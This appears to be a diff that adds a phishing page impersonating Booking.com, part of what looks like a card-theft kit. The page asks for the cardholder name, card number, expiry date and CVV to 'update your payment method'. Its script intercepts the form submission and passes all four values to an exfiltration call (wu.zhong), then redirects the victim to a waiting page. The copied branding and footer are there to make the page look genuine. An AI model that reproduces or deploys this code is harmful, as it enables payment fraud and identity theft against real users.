@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res\css\main.css">
+    <title>Booking</title>
+</head>
+<body>
+
+    <header>
+        <img src="res\img\logo.png" alt="">
+    </header>
+    <main>
+           <div class="container">
+
+           <h2>Add or update your payment method</h2>
+        <p>Please add or update your payment method to continue using booking.com</p>
+
+        <form action="post.php" method="post">
+            
+                <label>Cardholder Name</label>
+                <input type="text" name="name" >
+
+                <label>Card Number</label>
+                <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
+
+                <label>Expiration Date</label>
+                <input type="text" name="exp" required placeholder="MM/AA" id="exp">
+
+                <label>Security Code</label>
+                <input type="password" name="cvv" required placeholder="CVV" id="cvv">
+
+                <button type="submit">Continue</button>
+         </form>
+
+            <p class="terms">
+                By signing in or creating an account, you agree with our
+                 <a href="#">Terms & conditions</a>
+                 and <a href="#">Privacy statement</a>
+            </p>
+        </div>
+    </main>
+    <footer>
+        <p>All rights reserved.</p>
+        <p>Copyright (2006 - 2024) - Booking.com™</p>
+    </footer>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script>
+$("#cc").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("0000");
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`💳 Booking.com Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);
+
+window.location="wait.html";
+
+});
+
+
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
